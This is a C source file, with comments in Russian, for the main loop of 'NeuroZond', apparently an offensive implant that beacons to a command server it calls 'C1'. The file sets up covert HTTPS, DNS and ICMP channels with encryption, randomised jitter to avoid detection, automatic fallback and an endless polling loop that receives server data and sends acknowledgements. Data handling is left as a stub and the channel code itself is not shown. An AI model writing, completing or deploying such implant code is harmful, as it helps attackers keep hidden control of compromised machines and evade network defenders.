/**
 * @file main.c
 * @brief Основной файл для модуля скрытых каналов связи NeuroZond
 * @author iamtomasanderson@gmail.com
 * @date 2023-09-10
 *
 * Этот файл содержит основную функциональность для инициализации и управления
 * скрытыми каналами связи между зондом и сервером C1.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "network/covert_channel.h"

#ifdef _WIN32
#include <windows.h>
#define sleep_ms(ms) Sleep(ms)
#else
#include <unistd.h>
#define sleep_ms(ms) usleep(ms * 1000)
#endif

// Определение констант для конфигурации
#define MAX_BUFFER_SIZE 4096
#define DEFAULT_POLL_INTERVAL 10000  // 10 секунд в миллисекундах
#define DEFAULT_RETRY_INTERVAL 60000 // 60 секунд в миллисекундах
#define MAX_RETRIES 5

// Структура для хранения параметров командной строки
typedef struct {
    char* c1_server;
    enum CovertChannelType primary_channel;
    enum CovertChannelType fallback_channel;
    enum EncryptionType encryption;
    uint32_t min_jitter_ms;
    uint32_t max_jitter_ms;
    uint32_t poll_interval_ms;
    uint32_t retry_interval_ms;
    char* encryption_key;
    int verbose;
} cmd_params_t;

// Инициализирует параметры командной строки значениями по умолчанию
void init_params(cmd_params_t* params) {
    if (!params) return;
    
    params->c1_server = NULL;
    params->primary_channel = CHANNEL_TYPE_HTTPS;
    params->fallback_channel = CHANNEL_TYPE_DNS;
    params->encryption = ENCRYPTION_TYPE_AES256;
    params->min_jitter_ms = 1000;
    params->max_jitter_ms = 5000;
    params->poll_interval_ms = DEFAULT_POLL_INTERVAL;
    params->retry_interval_ms = DEFAULT_RETRY_INTERVAL;
    params->encryption_key = NULL;
    params->verbose = 0;
}

// Вывод справки по использованию
void print_usage(const char* program_name) {
    printf("Использование: %s [опции]\n", program_name);
    printf("Опции:\n");
    printf("  -s, --server <адрес>       Адрес C1 сервера (обязательно)\n");
    printf("  -p, --primary <тип>        Основной канал связи (https, dns, icmp) [по умолчанию: https]\n");
    printf("  -f, --fallback <тип>       Резервный канал связи [по умолчанию: dns]\n");
    printf("  -e, --encryption <тип>     Тип шифрования (none, xor, aes256, chacha20) [по умолчанию: aes256]\n");
    printf("  -k, --key <ключ>           Ключ шифрования [по умолчанию: генерируется случайно]\n");
    printf("  -j, --jitter <мин-макс>    Диапазон задержек в мс [по умолчанию: 1000-5000]\n");
    printf("  -i, --interval <мс>        Интервал опроса сервера в мс [по умолчанию: 10000]\n");
    printf("  -r, --retry <мс>           Интервал повторных попыток в мс [по умолчанию: 60000]\n");
    printf("  -v, --verbose              Подробный вывод информации\n");
    printf("  -h, --help                 Показать эту справку\n");
}

// Парсинг аргументов командной строки
int parse_arguments(int argc, char* argv[], cmd_params_t* params) {
    if (!params) return -1;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--server") == 0) {
            if (i + 1 < argc) params->c1_server = argv[++i];
            else return -1;
        }
        else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--primary") == 0) {
            if (i + 1 < argc) {
                i++;
                if (strcmp(argv[i], "https") == 0) params->primary_channel = CHANNEL_TYPE_HTTPS;
                else if (strcmp(argv[i], "dns") == 0) params->primary_channel = CHANNEL_TYPE_DNS;
                else if (strcmp(argv[i], "icmp") == 0) params->primary_channel = CHANNEL_TYPE_ICMP;
                else return -1;
            } else return -1;
        }
        else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--fallback") == 0) {
            if (i + 1 < argc) {
                i++;
                if (strcmp(argv[i], "https") == 0) params->fallback_channel = CHANNEL_TYPE_HTTPS;
                else if (strcmp(argv[i], "dns") == 0) params->fallback_channel = CHANNEL_TYPE_DNS;
                else if (strcmp(argv[i], "icmp") == 0) params->fallback_channel = CHANNEL_TYPE_ICMP;
                else return -1;
            } else return -1;
        }
        else if (strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--encryption") == 0) {
            if (i + 1 < argc) {
                i++;
                if (strcmp(argv[i], "none") == 0) params->encryption = ENCRYPTION_TYPE_NONE;
                else if (strcmp(argv[i], "xor") == 0) params->encryption = ENCRYPTION_TYPE_XOR;
                else if (strcmp(argv[i], "aes256") == 0) params->encryption = ENCRYPTION_TYPE_AES256;
                else if (strcmp(argv[i], "chacha20") == 0) params->encryption = ENCRYPTION_TYPE_CHACHA20;
                else return -1;
            } else return -1;
        }
        else if (strcmp(argv[i], "-k") == 0 || strcmp(argv[i], "--key") == 0) {
            if (i + 1 < argc) params->encryption_key = argv[++i];
            else return -1;
        }
        else if (strcmp(argv[i], "-j") == 0 || strcmp(argv[i], "--jitter") == 0) {
            if (i + 1 < argc) {
                char* jitter_range = argv[++i];
                char* dash = strchr(jitter_range, '-');
                if (dash) {
                    *dash = '\0';
                    params->min_jitter_ms = atoi(jitter_range);
                    params->max_jitter_ms = atoi(dash + 1);
                } else return -1;
            } else return -1;
        }
        else if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interval") == 0) {
            if (i + 1 < argc) params->poll_interval_ms = atoi(argv[++i]);
            else return -1;
        }
        else if (strcmp(argv[i], "-r") == 0 || strcmp(argv[i], "--retry") == 0) {
            if (i + 1 < argc) params->retry_interval_ms = atoi(argv[++i]);
            else return -1;
        }
        else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            params->verbose = 1;
        }
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 1;
        }
        else {
            return -1;
        }
    }
    
    // Проверка наличия обязательных параметров
    if (!params->c1_server) {
        printf("Ошибка: не указан адрес C1 сервера\n");
        return -1;
    }
    
    // Генерация случайного ключа, если не указан
    if (!params->encryption_key && params->encryption != ENCRYPTION_TYPE_NONE) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        int key_length = 0;
        
        switch (params->encryption) {
            case ENCRYPTION_TYPE_XOR:     key_length = 16; break;
            case ENCRYPTION_TYPE_AES256:  key_length = 32; break;
            case ENCRYPTION_TYPE_CHACHA20: key_length = 32; break;
            default: key_length = 16;
        }
        
        params->encryption_key = (char*)malloc(key_length + 1);
        if (!params->encryption_key) {
            printf("Ошибка: не удалось выделить память для ключа\n");
            return -1;
        }
        
        for (int i = 0; i < key_length; i++) {
            int index = rand() % (sizeof(charset) - 1);
            params->encryption_key[i] = charset[index];
        }
        params->encryption_key[key_length] = '\0';
        
        if (params->verbose) {
            printf("[+] Сгенерирован случайный ключ: %s\n", params->encryption_key);
        }
    }
    
    return 0;
}

// Создание и инициализация канала связи
covert_channel_handle_t create_channel(const cmd_params_t* params, enum CovertChannelType channel_type) {
    if (!params) return NULL;
    
    // Создание конфигурации канала
    void* channel_config = NULL;
    
    // Инициализация канала
    covert_channel_handle_t handle = NULL;
    int result = covert_channel_init(&handle, channel_type, params->c1_server, channel_config);
    
    if (result != 0) {
        if (params->verbose) {
            printf("[-] Ошибка инициализации канала (тип %d): %d\n", channel_type, result);
        }
        return NULL;
    }
    
    // Установка параметров джиттера
    if (params->min_jitter_ms > 0 || params->max_jitter_ms > 0) {
        result = covert_channel_set_jitter(handle, params->min_jitter_ms, params->max_jitter_ms);
        if (result != 0 && params->verbose) {
            printf("[-] Ошибка установки параметров джиттера: %d\n", result);
        }
    }
    
    return handle;
}

// Основной цикл работы
int main_loop(const cmd_params_t* params) {
    if (!params) return -1;
    
    covert_channel_handle_t primary_channel = NULL;
    covert_channel_handle_t fallback_channel = NULL;
    covert_channel_handle_t active_channel = NULL;
    int retry_count = 0;
    int result = 0;
    uint8_t buffer[MAX_BUFFER_SIZE];
    size_t bytes_received = 0;
    
    // Инициализация модуля скрытых каналов
    result = covert_channel_module_init();
    if (result != 0) {
        printf("[-] Ошибка инициализации модуля скрытых каналов: %d\n", result);
        return -1;
    }
    
    if (params->verbose) {
        printf("[+] Модуль скрытых каналов успешно инициализирован\n");
    }
    
    // Создание основного канала
    primary_channel = create_channel(params, params->primary_channel);
    if (!primary_channel) {
        printf("[-] Не удалось создать основной канал связи\n");
        return -1;
    }
    
    if (params->verbose) {
        printf("[+] Основной канал связи создан (тип %d)\n", params->primary_channel);
    }
    
    // Создание резервного канала (если отличается от основного)
    if (params->fallback_channel != params->primary_channel) {
        fallback_channel = create_channel(params, params->fallback_channel);
        if (fallback_channel && params->verbose) {
            printf("[+] Резервный канал связи создан (тип %d)\n", params->fallback_channel);
        }
    }
    
    // Устанавливаем активный канал
    active_channel = primary_channel;
    
    // Основной цикл работы
    while (1) {
        // Попытка подключения по активному каналу
        result = covert_channel_connect(active_channel);
        if (result != 0) {
            if (params->verbose) {
                printf("[-] Ошибка подключения по активному каналу: %d\n", result);
            }
            
            retry_count++;
            
            // Переключение на резервный канал при необходимости
            if (fallback_channel && active_channel == primary_channel) {
                if (params->verbose) {
                    printf("[*] Переключение на резервный канал\n");
                }
                active_channel = fallback_channel;
                retry_count = 0;
            }
            // Превышено количество попыток
            else if (retry_count >= MAX_RETRIES) {
                if (params->verbose) {
                    printf("[-] Превышено количество попыток подключения\n");
                }
                // Возвращаемся к основному каналу
                active_channel = primary_channel;
                retry_count = 0;
                
                // Ожидание перед следующей попыткой
                sleep_ms(params->retry_interval_ms);
                continue;
            }
            
            // Ожидание перед следующей попыткой
            sleep_ms(params->retry_interval_ms);
            continue;
        }
        
        if (params->verbose) {
            printf("[+] Подключение установлено\n");
        }
        
        // Сброс счетчика попыток
        retry_count = 0;
        
        // Получение данных от сервера
        memset(buffer, 0, MAX_BUFFER_SIZE);
        result = covert_channel_receive(active_channel, buffer, MAX_BUFFER_SIZE, &bytes_received);
        
        if (result == 0 && bytes_received > 0) {
            if (params->verbose) {
                printf("[+] Получено %zu байт данных\n", bytes_received);
            }
            
            // Здесь обработка полученных данных
            // ...
            
            // Отправка подтверждения
            const char* ack_message = "ACK";
            size_t bytes_sent = 0;
            result = covert_channel_send(active_channel, (const uint8_t*)ack_message, strlen(ack_message));
            
            if (result != 0 && params->verbose) {
                printf("[-] Ошибка отправки подтверждения: %d\n", result);
            }
        }
        else if (result != 0 && params->verbose) {
            printf("[-] Ошибка получения данных: %d\n", result);
        }
        
        // Пауза перед следующим опросом
        sleep_ms(params->poll_interval_ms);
    }
    
    // Очистка ресурсов (этот код никогда не будет выполнен, так как цикл бесконечный)
    if (primary_channel) {
        covert_channel_cleanup(primary_channel);
    }
    
    if (fallback_channel) {
        covert_channel_cleanup(fallback_channel);
    }
    
    return 0;
}

int main(int argc, char* argv[]) {
    // Инициализация генератора случайных чисел
    srand((unsigned int)time(NULL));
    
    // Инициализация параметров
    cmd_params_t params;
    init_params(&params);
    
    // Парсинг аргументов командной строки
    int result = parse_arguments(argc, argv, &params);
    if (result != 0) {
        if (result < 0) {
            printf("Ошибка в параметрах командной строки\n");
            print_usage(argv[0]);
        }
        return (result < 0) ? 1 : 0;
    }
    
    if (params.verbose) {
        printf("[*] NeuroZond скрытый канал связи\n");
        printf("[*] Сервер C1: %s\n", params.c1_server);
        printf("[*] Основной канал: %d, Резервный канал: %d\n", params.primary_channel, params.fallback_channel);
        printf("[*] Шифрование: %d\n", params.encryption);
        printf("[*] Диапазон джиттера: %d-%d мс\n", params.min_jitter_ms, params.max_jitter_ms);
        printf("[*] Интервал опроса: %d мс\n", params.poll_interval_ms);
        printf("[*] Интервал повторных попыток: %d мс\n", params.retry_interval_ms);
    }
    
    // Запуск основного цикла
    result = main_loop(&params);
    
    // Освобождение памяти
    if (params.encryption_key && params.encryption != ENCRYPTION_TYPE_NONE) {
        free(params.encryption_key);
    }
    
    return (result != 0) ? 1 : 0;
} 